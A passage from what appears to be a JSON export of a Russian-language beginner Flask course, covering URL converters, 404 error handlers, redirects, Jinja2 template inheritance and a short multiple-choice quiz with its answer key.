class=\"a\"><code>@app.route(\"/users/&lt;username&gt;\")</code></p><p>Тот же запрос приведёт к ошибке.</p><p></p><h4>&nbsp;</h4><h4>Повторение и резюмирование информации про переменную часть адреса <span lang=\"EN-US\">URL</span>.</h4><p>Правила для переменной части URL-адреса.</p><p>Для составления динамически меняющихся URL-адресов, необходимо изменяемые части адреса выделять как &lt;variable_name&gt;. Затем эти части передаются в функцию, в виде аргумента с именем variable_name. Также в изменяемых частях может быть использован конвертер, который задает правила следующего вида &lt;converter:variable_name&gt;.</p><p>Например:</p><pre><code class=\"language-python\">@app.route('/user/&lt;username&gt;')<span style=\"line-height:115%;mso-bidi-font-size:12.5pt;\"></span>\r\ndef show_user_profile(username):<span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:12.5pt;\" lang=\"EN-US\"></span>\r\n &nbsp;&nbsp; # выведет имя профиля пользователя `username`<span style=\"line-height:115%;mso-bidi-font-size:12.5pt;\"></span>\r\n &nbsp;&nbsp; return f'Пользователь: {username}'<span style=\"line-height:115%;mso-bidi-font-size:12.5pt;\"></span></code></pre><p class=\"a\"></p><pre><code class=\"language-python\">@app.route('/post/&lt;int:post_id&gt;')<span style=\"line-height:115%;mso-bidi-font-size:12.5pt;\"></span>\r\ndef show_post(post_id):<span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:12.5pt;\" lang=\"EN-US\"></span>\r\n &nbsp;&nbsp; # выведет страницу с данным `post_id` (целое число)<span style=\"line-height:115%;mso-bidi-font-size:12.5pt;\"></span>\r\n &nbsp;&nbsp; return f'Post {post_id}'<span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:12.5pt;\" lang=\"EN-US\"></span></code></pre><p class=\"a\"><span lang=\"EN-US\"></span></p><pre><code class=\"language-python\">@app.route('/path/&lt;path:subpath&gt;')<span lang=\"EN-US\"></span>\r\ndef show_subpath(subpath):<span lang=\"EN-US\"></span>\r\n &nbsp;&nbsp; # выведет subpath после /path/<span lang=\"EN-US\"></span>\r\n &nbsp;&nbsp; return f'Subpath {subpath}'</code></pre><p></p><p>В Flask существуют следующие конвертеры:</p><p>int: принимаются <span style=\"color:windowtext;\"><span style=\"text-decoration:none;text-underline:none;\">целочисленные значения</span></span>;</p><p>float: принимаются <span style=\"color:windowtext;\"><span style=\"text-decoration:none;text-underline:none;\">значения с плавающей точкой</span></span>;</p><p>path: принимает строки (как по умолчанию), но также принимает слэши;</p><p>uuid: принимает строки UUID.</p><p>&nbsp;</p><p></p><h4>2. Декоратор errorhandler</h4><p>Следующим важным моментом при разработке сайта является отлавливание некоторых ошибок <span lang=\"EN-US\">http</span>-ответа сервера. Например, при отсутствии или неправильном адресе какой-либо страницы пользователь в браузере увидит следующее:</p><figure class=\"image image_resized\" style=\"width:58.14%;\"><img style=\"aspect-ratio:746/141;\" src=\"https://gvylosdtlepiikialkhn.supabase.co/storage/v1/object/public/lesson-images/ee773d9e-34d8-4723-bb33-e19377969d4f.png\" width=\"746\" height=\"141\"></figure><p><span></span></p><p>Это есть стандартный ответ сервера с кодом 404 – страница не найдена. В таких ситуациях лучше иметь обработчик для кода 404, который бы возвращал пользователю более дружественную информацию.</p><p></p><p>1. Чтобы создать такой обработчик, следует использовать специальный декоратор errorhandler с указанием в нем кода ответа, с которым будет ассоциирована функция представления:</p><pre><code class=\"language-python\">@app.errorhandler(404)<span lang=\"EN-US\"></span>\r\ndef pageNotFount(error):<span lang=\"EN-US\"></span>\r\n  return render_template('page404.html', title=\"Страница не найдена\"), 404<span lang=\"EN-US\"></span></code></pre><p><span lang=\"EN-US\"></span></p><p>2. Затем, добавим шаблон page404.html, например, такой:</p><pre><code class=\"language-python\">{% extends 'base.html' %}<span lang=\"EN-US\"></span>\r\n<span lang=\"EN-US\"></span>\r\n{% block content %}<span lang=\"EN-US\"></span>\r\n  Страница не найдена, вернуться на &lt;a href=\"/\"&gt;Главную&lt;/a&gt; страницу.\r\n{% endblock %}</code></pre><p></p><p>И при обновлении страницы, увидим более дружественное сообщение:</p><figure class=\"image image_resized\" style=\"width:38.65%;\"><img style=\"aspect-ratio:598/92;\" src=\"https://gvylosdtlepiikialkhn.supabase.co/storage/v1/object/public/lesson-images/dd7007ed-efb7-4b9b-b7c1-0d6246a3da2b.png\" width=\"598\" height=\"92\"></figure><p><span></span></p><h2><span lang=\"EN-US\"></span></h2><h4>3. функция <span lang=\"EN-US\">redirect</span>().</h4><p>Чтобы перенаправить пользователя на другую страницу сайта, используйте функцию <span style=\"font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;;\"><code><span>flask.redirect()</span></code></span>.</p><p>Перед использованием необходимо импортировать классы <span>redirect</span> и <span>url_for :</span></p><p class=\"a\"><code><span lang=\"EN-US\">from flask import redirect</span></code></p><p class=\"a\"><code><span lang=\"EN-US\">from flask import url_for</span></code><span lang=\"EN-US\"></span></p><p>Для примера при переходе пользователя на страницу \"О приложении\" сделаем перенаправление (конечно бессмысленное) на страницу \"Логин\".</p><p>Поменяйте (временно) код обработчика /about/ :</p><pre><code class=\"language-python\">@app.route(\"/about/\")<span lang=\"EN-US\"></span>\r\ndef about():<span lang=\"EN-US\"></span>\r\n &nbsp; return redirect(url_for('login'))<span lang=\"EN-US\"></span></code></pre><p>Теперь при нажатии ссылки \"О приложении\" пользователь попадает на \"Логин\".</p><p>(если, вдруг, вы удалили ссылку (маршрут) \"О приложении\", добавьте её в навигационное меню в файле <span lang=\"EN-US\">base</span>.<span lang=\"EN-US\">html</span>)</p><p></p><p>Можно сделать перенаправление на внешний сайт:</p><p class=\"a\"><code><span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:13.5pt;\" lang=\"EN-US\">return redirect('https://www.youtube.com/')</span></code><span lang=\"EN-US\"></span></p><p>То же несколько бессмысленно, поскольку это можно сделать статичной гиперссылкой. Функция url_for тут не используется, поскольку это не маршрут в нашем приложении, а внешний <span lang=\"EN-US\">URL</span>.</p><p>Теперь верните назад код обработчика /about/</p><p>Позже мы сделаем более осмысленный <span lang=\"EN-US\">redirect</span>, когда реализуем полнофункциональную регистрацию пользователей.</p><p></p><p>&nbsp;</p>"
            },
            "is_published": true
        },
        {
            "id": 2,
            "section_id": 1,
            "number": 2,
            "name": "Создание web-страниц. Подключение CSS",
            "slug": "creating-web-pages--including-css",
            "content": {
                "tasks": [
                    {
                        "id": 1,
                        "content": "<p class=\"MsoNormal\">Создайте третью страницу contacts.html, добавьте подходящий <span style=\"mso-ansi-language:EN-US;\" lang=\"EN-US\">HTML</span>, добавьте для неё маршрут во Flask-приложении и пункт меню в base.html. Протестируйте приложение, убедитесь, что все гиперссылки / переходы работают.</p>"
                    },
                    {
                        "id": 2,
                        "content": "<p><span style=\"color:black;font-family:;\" times=\"\" new=\"\" roman\",\"serif\";font-size:14.0pt;line-height:115%;mso-ansi-language:ru;mso-bidi-language:ar-sa;mso-bidi-theme-font:minor-bidi;mso-fareast-font-family:calibri;mso-fareast-language:en-us;mso-fareast-theme-font:minor-latin;mso-themecolor:text1;\"=\"\">Стилизуйте меню так, чтобы пункты меню выглядели в виде нажимаемых кнопок и располагались вверху страницы горизонтально.</span></p><p><span style=\"color:black;font-family:;\" times=\"\" new=\"\" roman\",\"serif\";font-size:14.0pt;line-height:115%;mso-ansi-language:ru;mso-bidi-language:ar-sa;mso-bidi-theme-font:minor-bidi;mso-fareast-font-family:calibri;mso-fareast-language:en-us;mso-fareast-theme-font:minor-latin;mso-themecolor:text1;\"=\"\">(Если вы не знакомы с CSS задача будет сложной. Тем интересней взяться за её выполнение. Можно воспользоваться ИИ кодогенерацией)</span></p>"
                    }
                ],
                "tests": [
                    {
                        "id": 1,
                        "options": [
                            "Хранение CSS, JS и изображений",
                            "Хранение HTML-шаблонов страниц ",
                            "Хранение Python-модулей",
                            "Хранение текстового контента"
                        ],
                        "question": "Какое назначение папки templates в Flask-приложении?",
                        "correct_index": 1
                    },
                    {
                        "id": 2,
                        "options": [
                            "Для рендеринга HTML-шаблонов и отправки их клиенту ",
                            "Для обработки CSS-файлов",
                            "Для отправки HTML-кода в браузер без шаблонов",
                            "Для обработки маршрутов"
                        ],
                        "question": "Для чего используется функция render_template() во Flask?",
                        "correct_index": 0
                    },
                    {
                        "id": 3,
                        "options": [
                            "templates ",
                            "static",
                            "content",
                            "html"
                        ],
                        "question": "В какой папке Flask по умолчанию ищет HTML-шаблоны?",
                        "correct_index": 0
                    },
                    {
                        "id": 4,
                        "options": [
                            "Flask Templates",
                            "Mako",
                            "Ninja2",
                            "Jinja2 "
                        ],
                        "question": "Какой шаблонизатор используется во Flask по умолчанию?",
                        "correct_index": 3
                    },
                    {
                        "id": 5,
                        "options": [
                            "index.html",
                            "layout.html",
                            "main.html",
                            "base.html "
                        ],
                        "question": "Какой файл используется в качестве базового шаблона для всех страниц?",
                        "correct_index": 3
                    },
                    {
                        "id": 6,
                        "options": [
                            "{{ block name }}",
                            "{% block name %} ... {% endblock %} ",
                            "<block name> … </block name>",
                            "<!-- block name --> "
                        ],
                        "question": "Какой синтаксис используется в Jinja2 для определения блоков?",
                        "correct_index": 1
                    },
                    {
                        "id": 7,
                        "options": [
                            "Копирует HTML-код из base.html",
                            "Подключает CSS из base.html",
                            "Указывает, что шаблон наследуется от base.html ",
                            "Расширяет маршрут страницы"
                        ],
                        "question": "Что делает директива {% extends 'base.html' %} в шаблоне страницы?",
                        "correct_index": 2
                    },
                    {
                        "id": 8,
                        "options": [
                            "В папке templates",
                            "В папке content",
                            "В папке static ",
                            "В папке css"
                        ],
                        "question": "Где должны располагаться CSS-файлы во Flask-приложении?",
                        "correct_index": 2
                    },
                    {
                        "id": 9,
                        "options": [
                            "<link rel=\"stylesheet\" href=\"/static/style.css\"> ",
                            "<link rel=\"stylesheet\" href=\"{{ style.css }}\"> ",
                            "<link rel=\"stylesheet\" href=\"static/style.css\"> ",
                            "<link rel=\"stylesheet\" href=\"{{ url_for('static', filename='style.css') }}\"> "
                        ],
                        "question": "Как правильно подключить CSS-файл в шаблоне Flask?",
                        "correct_index": 3
                    },
                    {
                        "id": 10,
                        "options": [
                            "В браузере пользователя",
                            "В JavaScript-коде",
                            "На сервере Flask ",
                            "Где получится"
                        ],
                        "question": "Где происходит сборка HTML-страницы при использовании шаблонов Flask?",
                        "correct_index": 2
                    }
                ],
                "theory_html": "<h4>1. Использование шаблонов web-страниц.</h4><p>В реальном приложении нам нужно выводить в браузер не простой текст, а готовые <span lang=\"EN-US\">web</span>-страницы (<span lang=\"EN-US\">html</span>-файлы), в соответствии с содержимым и структурой нашего сайта. Для этого используется механизм создания и рендеринга шаблонов. Но сначала создадим правильную структуру папок нашего проекта.</p><p></p><p>&nbsp;</p><p>1. В папке проекта создайте ещё три папки '<span lang=\"EN-US\">templates</span>', '<span lang=\"EN-US\">static</span>', '<span lang=\"EN-US\">content</span>'. Запускающий файл приложения <span lang=\"EN-US\">app</span>.<span lang=\"EN-US\">py</span><span lang=\"EN-US\"> </span>уже есть.</p><p>В папке '<span lang=\"EN-US\">templates</span>' будут находится шаблоны <span lang=\"EN-US\">html</span>-страниц, т.е. файлы с необходимой <span lang=\"EN-US\">HTML</span>-разметкой но без информации. В папке '<span lang=\"EN-US\">content</span>' будет находится добавляемая на страницы информация. Она может быть в разных форматах, наиболее простой - обычные .<span lang=\"EN-US\">txt</span>-файлы (но об этом позже).</p><p>Т.е. итоговая, выводимая в браузер <span lang=\"EN-US\">web</span>-страница будет представлять собой соединение <span lang=\"EN-US\">HTML</span>-разметки (структуры, шаблона) и полезной (сменяемой) информации (контента). Т.е. на основе одной и той-же разметки можно сформировать много различных страниц с разной информацией. В папке '<span lang=\"EN-US\">static</span>' будут находиться изображения, <span lang=\"EN-US\">css</span>-файлы, <span lang=\"EN-US\">js</span>-файлы, и т.п. внешние ресурсы.</p><p>Т.е. папка любого приложения <span lang=\"EN-US\">Flask</span> будет выглядеть обязательно так:</p><p><span></span></p><p><span>&nbsp;</span></p><p>2. Зайдите в папку '<span lang=\"EN-US\">templates</span>'. Здесь будут <span lang=\"EN-US\">html</span>-шаблоны страниц, например: <span lang=\"EN-US\">index</span>.<span lang=\"EN-US\">html</span><span lang=\"EN-US\"> </span>(главная, домашняя), <span lang=\"EN-US\">about</span>.<span lang=\"EN-US\">html</span>, <span lang=\"EN-US\">login</span>.<span lang=\"EN-US\">html</span>, <span lang=\"EN-US\">contacts</span>.<span lang=\"EN-US\">html</span> и другие, в зависимости от сути сайта. Для начала сделаем две <span lang=\"EN-US\">html</span>-страницы и запустим их.</p><p>&nbsp;</p><p>3. В папке <span lang=\"EN-US\">templates</span><span lang=\"EN-US\"> </span>создайте файл <span lang=\"EN-US\">index</span>.<span lang=\"EN-US\">html</span><span lang=\"EN-US\"> </span>со следующим <span lang=\"EN-US\">HTML</span>-кодом:</p><pre><code class=\"language-plaintext\">&lt;!DOCTYPE html&gt;<span lang=\"EN-US\"></span>\r\n&lt;html&gt;<span lang=\"EN-US\"></span>\r\n  &lt;head&gt;<span lang=\"EN-US\"></span>\r\n &nbsp;&nbsp; &lt;title&gt;Main page&lt;/title&gt;<span lang=\"EN-US\"></span>\r\n  &lt;/head&gt;\r\n  &lt;body&gt;\r\n &nbsp;&nbsp; &lt;h1&gt;Главная страница&lt;/h1&gt;\r\n  &lt;/body&gt;\r\n&lt;/html&gt;</code></pre><p></p><p>&nbsp;</p><p>4. Также создайте файл <span lang=\"EN-US\">about</span>.<span lang=\"EN-US\">html</span><span lang=\"EN-US\"> </span>со следующим кодом:</p><pre><code class=\"language-plaintext\">&lt;!DOCTYPE html&gt;<span lang=\"EN-US\"></span>\r\n&lt;html&gt;<span lang=\"EN-US\"></span>\r\n  &lt;head&gt;<span lang=\"EN-US\"></span>\r\n &nbsp;&nbsp; &lt;title&gt;About&lt;/title&gt;<span lang=\"EN-US\"></span>\r\n  &lt;/head&gt;\r\n  &lt;body&gt;\r\n &nbsp;&nbsp; &lt;h1&gt;О приложении&lt;/h1&gt;\r\n  &lt;/body&gt;\r\n&lt;/html&gt;</code></pre><p></p><p>&nbsp;</p><p>5. Основной файл приложения <span lang=\"EN-US\">app</span>.<span lang=\"EN-US\">py</span> измените следующим образом:</p><pre><code class=\"language-plaintext\">from flask import Flask, render_template<span lang=\"EN-US\"></span>\r\n<span lang=\"EN-US\"></span>\r\napp = Flask(__name__)<span lang=\"EN-US\"></span>\r\n<span lang=\"EN-US\"></span>\r\n@app.route(\"/\")<span lang=\"EN-US\"></span>\r\ndef index():<span lang=\"EN-US\"></span>\r\n &nbsp;&nbsp; return render_template(\"index.html\")<span lang=\"EN-US\"></span>\r\n<span lang=\"EN-US\"></span>\r\n@app.route(\"/about/\")<span lang=\"EN-US\"></span>\r\ndef about():<span lang=\"EN-US\"></span>\r\n &nbsp;&nbsp; return render_template(\"about.html\")<span lang=\"EN-US\"></span>\r\n<span lang=\"EN-US\"></span>\r\nif __name__ == \"__main__\":<span lang=\"EN-US\"></span>\r\n &nbsp;&nbsp; app.run(debug=True)<span lang=\"EN-US\"></span></code></pre><p><span lang=\"EN-US\"></span></p><p>Пояснения к коду:</p><p>Обратите внимания: в строку импорта мы добавили подключение класса 'render_template', который обеспечивает запрос <span lang=\"EN-US\">html</span>-страницы и отправку её в браузер для визуализации.</p><p>Функцию для рендеринга домашней страницы <span lang=\"EN-US\">index</span>.<span lang=\"EN-US\">html</span><span lang=\"EN-US\"> </span>мы назвали index(), которая вызывает функцию render_template(), которая параметром принимает имя файла рендеруемой <span lang=\"EN-US\">html</span>-страницы index.html. Файл этой страницы <span lang=\"EN-US\">Flask</span> ищет, по умолчанию, в папке '<span lang=\"EN-US\">templates</span>' .</p><p>Аналогичный код прописан для страницы '<span lang=\"EN-US\">about</span>.<span lang=\"EN-US\">html</span>' .</p><p>Обратите внимание, что маршруты страниц нужно писать со слэшем в конце маршрута:&nbsp;</p><p><code>@app.route(\"/about/\")</code></p><p></p><p></p><p>Перед запуском приложения обратите внимание, что, если вы закрывали окно терминала или закрывали <span lang=\"EN-US\">VS</span><span lang=\"EN-US\"> </span><span lang=\"EN-US\">Code</span>, то нужно заново активировать виртуальное окружение (для <span lang=\"EN-US\">windows</span>: venv\\Scripts\\activate). Чтобы каждый раз не искать эту строку в лекциях, или запомните или запишите в текстовый файл.</p><p>(можно настроить авто активацию <span lang=\"EN-US\">venv</span> в <span lang=\"EN-US\">VS</span><span lang=\"EN-US\"> </span><span lang=\"EN-US\">Code</span>, но в этом вопросе разберитесь самостоятельно).</p><p></p><p>&nbsp;</p><p>6. Запустите приложение, обновите браузер и убедитесь, что всё работает. Т.е. по адресу 127.0.0.1:5000 открывается главная (домашняя) страница <span lang=\"EN-US\">index</span>.<span lang=\"EN-US\">html</span>, а по адресу 127.0.0.1:5000/about открывается страница 'О приложении' .</p><p></p><p>Чтобы запомнить о необходимости слэша в конце маршрута (/<span lang=\"EN-US\">about</span>/) - попробуйте убрать конечный слэш и обновить страницу.</p><p>Разница между /about и /about/ связана с тем, как Flask (и веб-серверы в целом) трактуют URL и маршруты.</p><p>Но об этом, пока, думать не надо.</p><p></p><p>Однако вышеприведённый пример специально упрощён. Реальные <span lang=\"EN-US\">web</span>-страницы имеют гораздо более сложную структуру <span lang=\"EN-US\">HTML</span>-кода, с подключением <span lang=\"EN-US\">CSS</span>, <span lang=\"EN-US\">JS</span>, изображений и других ресурсов, переход по страницам (маршрутам) осуществляется не через адресную строку, а через меню гиперссылок. поэтому разберём более практическую технологию.</p><p>&nbsp;</p><p></p><h4>2. Использование базового<span>&nbsp; </span>шаблона.</h4><p>Обычно, все <span lang=\"EN-US\">web</span>-страницы имеют повторяющиеся части <span lang=\"EN-US\">Header</span>, <span lang=\"EN-US\">Menu</span>, <span lang=\"EN-US\">Footer</span> и другое. Также все страницы имеют одинаковое подключение <span lang=\"EN-US\">CSS</span>, <span lang=\"EN-US\">JS</span><span lang=\"EN-US\"> </span>файлов и т.п. Имеет смысл вынести эти повторяющиеся части в отдельный файл, а в конкретные <span lang=\"EN-US\">html</span>-страницы его подключать. Здесь есть ещё один плюс, если, например, мы захотим изменить/добавить/убрать, например, пункт меню, мы это сможем сделать в одном файле, и это изменение повторится в остальных <span lang=\"EN-US\">html</span>-файлах.</p><p>Эта базовая, общая, повторяющаяся разметка содержится в файле <span lang=\"EN-US\">base</span>.<span lang=\"EN-US\">html</span> (обязательно такое имя). На основе этого базового шаблона наследуются остальные страницы. Сама технология шаблонизации обеспечивается специальной библиотекой - шаблонизатором. В <span lang=\"EN-US\">Python</span><span lang=\"EN-US\"> </span>и <span lang=\"EN-US\">Flask</span><span lang=\"EN-US\"> </span>используется шаблонизатор Jinja2 (произносится дзиндзя). Ниже мы увидим как работает этот шаблонизатор и методика шаблонизации.</p><p>&nbsp;</p><p></p><p>1. В папке '<span lang=\"EN-US\">templates</span>' создайте файл '<span lang=\"EN-US\">base</span>.<span lang=\"EN-US\">html</span>' со следующим содержимым:</p><p>(базовый код вы можете добавить в <span lang=\"EN-US\">VS</span><span lang=\"EN-US\"> </span><span lang=\"EN-US\">Code</span> через восклицательный знак)</p><pre><code class=\"language-plaintext\">&lt;!DOCTYPE html&gt;<span lang=\"EN-US\"></span>\r\n&lt;html lang=\"ru\"&gt;<span lang=\"EN-US\"></span>\r\n&lt;head&gt;<span lang=\"EN-US\"></span>\r\n  &lt;meta charset=\"UTF-8\"&gt;<span lang=\"EN-US\"></span>\r\n  &lt;title&gt;{% block title %}{% endblock %}&lt;/title&gt;<span lang=\"EN-US\"></span>\r\n&lt;/head&gt;<span lang=\"EN-US\"></span>\r\n&lt;body&gt;<span lang=\"EN-US\"></span>\r\n  &lt;nav class=\"menu\"&gt;<span lang=\"EN-US\"></span>\r\n &nbsp;&nbsp; &lt;h2&gt;Меню&lt;/h2&gt;<span lang=\"EN-US\"></span>\r\n &nbsp;&nbsp; &lt;a href=\"{{ url_for('index') }}\"&gt;На Главную&lt;/a&gt;<span lang=\"EN-US\"></span>\r\n &nbsp;&nbsp; &lt;a href=\"{{ url_for('about') }}\"&gt;О приложении&lt;/a&gt;<span lang=\"EN-US\"></span>\r\n  &lt;/nav&gt;<span lang=\"EN-US\"></span>\r\n<span lang=\"EN-US\"></span>\r\n  &lt;header class=\"header\"&gt;<span lang=\"EN-US\"></span>\r\n &nbsp;&nbsp; &lt;h2&gt;Хэдер&lt;/h2&gt;<span lang=\"EN-US\"></span>\r\n  &lt;/header&gt;<span lang=\"EN-US\"></span>\r\n<span lang=\"EN-US\"></span>\r\n  &lt;main class=\"content\"&gt;<span lang=\"EN-US\"></span>\r\n &nbsp;&nbsp; {% block content %}<span lang=\"EN-US\"></span>\r\n &nbsp;&nbsp; {% endblock %}<span lang=\"EN-US\"></span>\r\n  &lt;/main&gt;<span lang=\"EN-US\"></span>\r\n<span lang=\"EN-US\"></span>\r\n  &lt;footer class=\"footer\"&gt;<span lang=\"EN-US\"></span>\r\n &nbsp;&nbsp; &lt;h2&gt;Футер&lt;/h2&gt;<span lang=\"EN-US\"></span>\r\n  &lt;/footer&gt;<span lang=\"EN-US\"></span>\r\n&lt;/body&gt;<span lang=\"EN-US\"></span>\r\n&lt;/html&gt;</code></pre><p></p><p>Пояснения к коду:</p><p>Данный файл содержит базовый <span lang=\"EN-US\">HTML</span>-код повторяющийся на всех страницах приложения. В нашем случае это раздел с метаинформацией <span lang=\"EN-US\">head</span>, а также разделы Навигация (Меню), Хэдер, Футер.</p><p>Согласно синтаксису Jinja2 гиперссылки на другие ресурсы или страницы приложения пишутся через конструкцию url_for() в двойных фигурных скобках в виде:</p><p class=\"a\"><code>&lt;<span lang=\"EN-US\">a</span><span lang=\"EN-US\"> </span><span lang=\"EN-US\">href</span>=\"{{ <span lang=\"EN-US\">url</span>_<span lang=\"EN-US\">for</span>('Имя_маршрута') }}\"&gt;Текст_гиперссылки&lt;/<span lang=\"EN-US\">a</span>&gt;</code></p><p>Синтаксическая конструкция url_for() позволяет менять маршруты в app.py, не трогая HTML-шаблоны и обеспечивает правильную обработку <span lang=\"EN-US\">URL</span>-адресов. Это единственно правильный способ работы со ссылками во Flask.</p><p></p><p>На месте изменяемого содержимого (блок <span lang=\"EN-US\">main</span>) делается специальная вставка:</p><p class=\"a\"><code>{% <span lang=\"EN-US\">block</span><span lang=\"EN-US\"> </span><span lang=\"EN-US\">content</span> %}</code></p><p class=\"a\"><code>{% <span lang=\"EN-US\">endblock</span> %}</code></p><p>вместо которой, вставляется содержимое (<span lang=\"EN-US\">HTML</span>-код) соответствующих <span lang=\"EN-US\">web</span>-страниц.</p><p>Также изменяемой частью на <span lang=\"EN-US\">web</span>-страницах является раздел &lt;<span lang=\"EN-US\">title</span>&gt; на месте которого тоже вставляется специальный блок :</p><p class=\"a\"><code>{% block title %}{% endblock %}</code></p><p>Такой необычный синтаксис {% ... %} - является специальным синтаксисом шаблонизатора Jinja2.</p><p><span style=\"color:black;mso-themecolor:text1;\"></span></p><p>&nbsp;</p><p><span style=\"color:black;mso-themecolor:text1;\">2. Файл </span><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">index</span><span style=\"color:black;mso-themecolor:text1;\">.</span><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">html</span><span style=\"color:black;mso-themecolor:text1;\"> измените следующим образом:</span></p><pre><code class=\"language-plaintext\">{% extends 'base.html' %}<span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"></span>\r\n\r\n{% block title %}Главная{% endblock %}<span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"></span>\r\n{% block content %}<span style=\"color:black;mso-themecolor:text1;\"></span>\r\n  &lt;h1&gt;Главная страница&lt;/h1&gt;<span style=\"color:black;mso-themecolor:text1;\"></span>\r\n{% endblock %}<span style=\"color:black;mso-themecolor:text1;\"></span></code></pre><p><span style=\"color:black;mso-themecolor:text1;\">Здесь мы сообщаем шаблонизатору, что страница </span><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">index</span><span style=\"color:black;mso-themecolor:text1;\">.</span><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">html</span><span style=\"color:black;mso-themecolor:text1;\"> формируется на основе базового шаблона 'base.html'. (</span><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">extends</span><span style=\"color:black;mso-themecolor:text1;\"> - расширяет). Вместо блока с именем 'title' вставляется содержимое: \"Главная\", а вместо</span><span style=\"color:black;mso-spacerun:yes;mso-themecolor:text1;\">&nbsp; </span><span style=\"color:black;mso-themecolor:text1;\">блока 'content' - содержимое \"&lt;h1&gt;Главная страница&lt;/h1&gt;\", т.е. </span><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">HTML</span><span style=\"color:black;mso-themecolor:text1;\">-код данной страницы.</span></p><p><span style=\"color:black;mso-themecolor:text1;\"></span></p><p>&nbsp;</p><p><span style=\"color:black;mso-themecolor:text1;\">3. Файл </span><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">about</span><span style=\"color:black;mso-themecolor:text1;\">.</span><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">html</span><span style=\"color:black;mso-themecolor:text1;\"> измените следующим образом:</span></p><pre><code class=\"language-plaintext\">{% extends 'base.html' %}\r\n<span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"></span>\r\n{% block title %}О приложении{% endblock %}<span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"></span>\r\n{% block content %}<span style=\"color:black;mso-themecolor:text1;\"></span>\r\n  &lt;h1&gt;Страница \"О приложении\"&lt;/h1&gt;<span style=\"color:black;mso-themecolor:text1;\"></span>\r\n{% endblock %}<span style=\"color:black;mso-themecolor:text1;\"></span></code></pre><p><span style=\"color:black;mso-themecolor:text1;\">Т.е. любая страница приложения собирается из двух частей: повторяющейся (неизменяемой) части берущейся из базового шаблона </span><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">base</span><span style=\"color:black;mso-themecolor:text1;\">.</span><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">html</span><span style=\"color:black;mso-themecolor:text1;\">, и специфичной (изменяемой) части берущейся из файла данной страницы.</span></p><p><span style=\"color:black;mso-themecolor:text1;\">Причём собирается страница на сервере, и в браузер клиента уходит уже готовая собранная страница.</span></p><p><i><span style=\"color:black;font-size:12.0pt;line-height:115%;mso-themecolor:text1;\">Есть другой подход, когда страница собирается в браузере клиента с помощью </span><span style=\"color:black;font-size:12.0pt;line-height:115%;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">JavaScript</span><span style=\"color:black;font-size:12.0pt;line-height:115%;mso-themecolor:text1;\">.</span></i></p><p><span style=\"color:black;mso-themecolor:text1;\"></span></p><p>&nbsp;</p><p><span style=\"color:black;mso-themecolor:text1;\">4. Запустите сервер, откройте приложение, походите по меню. Проследите как всё работает. Обратите внимание на изменение адреса в адресной строке, и изменение титульника страницы на вкладке.</span></p><p>&nbsp;</p><p><span style=\"color:black;mso-themecolor:text1;\">Задание.</span></p><p><span style=\"color:black;mso-themecolor:text1;\">Самостоятельно создайте третью </span><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">web</span><span style=\"color:black;mso-themecolor:text1;\">-страницу \"Контакты\" (</span><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">contacts</span><span style=\"color:black;mso-themecolor:text1;\">.</span><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">html</span><span style=\"color:black;mso-themecolor:text1;\">), с содержимым аналогичным другим страницам, в основном файле создайте соответствующий маршрут, в базовом шаблоне измените соответствующим образом меню. Запустите и протестируйте.</span></p><p><span style=\"color:black;mso-themecolor:text1;\"></span></p><p><span style=\"color:black;mso-themecolor:text1;\">Примечание: если в процессе разработки, из за ошибок в коде, у вас останавливается (падает) сервер (вы это увидите в терминале - ошибки) - нужно исправить ошибки и перезапустить приложение.</span></p><p><span style=\"color:black;mso-themecolor:text1;\"></span></p><p>&nbsp;</p><p><span style=\"color:black;mso-themecolor:text1;\">Задание.</span></p><p><span style=\"color:black;mso-themecolor:text1;\">Обычно меню делают в виде списка &lt;</span><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">ul</span><span style=\"color:black;mso-themecolor:text1;\">&gt;, а гиперссылки вставляют внутри пунктов списка &lt;</span><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">li</span><span style=\"color:black;mso-themecolor:text1;\">&gt;.</span></p><p><span style=\"color:black;mso-themecolor:text1;\">Сделайте это самостоятельно.</span></p><p>&nbsp;</p><p><span style=\"color:black;mso-themecolor:text1;\"></span></p><p><span style=\"color:black;mso-themecolor:text1;\"></span></p><h4>3. Подключение CSS.</h4><p><span style=\"color:black;mso-themecolor:text1;\">Понятно, что не бывает сайтов без </span><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">CSS</span><span style=\"color:black;mso-themecolor:text1;\">. </span><span style=\"color:black;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">CSS</span><span style=\"color:black;mso-themecolor:text1;\">, с точки зрения фреймворка </span><span 